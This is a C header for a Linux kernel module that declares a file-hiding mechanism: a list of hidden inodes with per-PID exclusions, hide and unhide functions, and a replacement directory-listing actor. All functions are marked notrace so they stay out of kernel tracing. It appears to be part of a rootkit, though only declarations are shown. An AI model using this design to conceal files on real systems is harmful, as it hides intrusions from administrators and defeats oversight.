#include <linux/fs.h>

#define ALL_PIDS 0
#define PARENT_PID -1

struct inode_list {
    unsigned long ino;
    struct list_head excluded_pids;
    struct list_head list;
};
extern struct list_head hidden_inodes;
extern filldir_t orig_actor;

notrace void hide_file_inode(unsigned long ino);
notrace int should_hide_inode(unsigned long ino);
notrace void show_file_inode(const void __user *user_info);
notrace void do_show_file_inode(unsigned long ino, int pid);
notrace int filldir_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);